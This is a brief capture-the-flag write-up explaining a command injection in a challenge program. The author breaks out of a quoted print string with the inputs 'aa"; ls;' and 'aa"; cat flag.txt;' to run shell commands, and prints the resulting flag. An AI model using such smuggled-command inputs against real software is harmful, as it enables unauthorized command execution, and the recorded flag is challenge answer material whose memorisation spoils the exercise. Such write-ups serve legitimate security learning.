The program is writing our input into the string and there's escape double quote that we can use

like command injection, we use "; to get out of the print string and put in the commands we want!

-----------------------------------
> ./connect.sh

first try
> aa"; ls;

and we saw there's a flag.txt file in the directory
then connect again and input the followings
> aa"; cat flag.txt;

flag: d8e19ff55181c64d289110851ca148c5
